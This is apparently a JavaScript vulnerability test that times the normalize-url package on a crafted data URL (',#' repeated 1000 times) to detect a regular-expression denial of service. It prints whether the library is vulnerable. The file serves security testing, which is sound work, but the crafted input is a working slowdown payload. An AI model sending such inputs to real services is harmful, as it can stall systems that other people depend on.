// test("ReDos in parsejson", () => {
  const measureTime = require("../utils").measureTime;
  const normalizeUrl = require("normalize-url");
  let t = measureTime(function () {
    try {
      normalizeUrl("data:" + ",#".repeat(1000) + "\nx");
    } catch (e) {}
  });
  let time = t[0] + t[1] / 1000000000;
if (time > 1) {
	console.log("this_is_vulnerable")
} else {
	console.log("this_is_OK")
}
// });
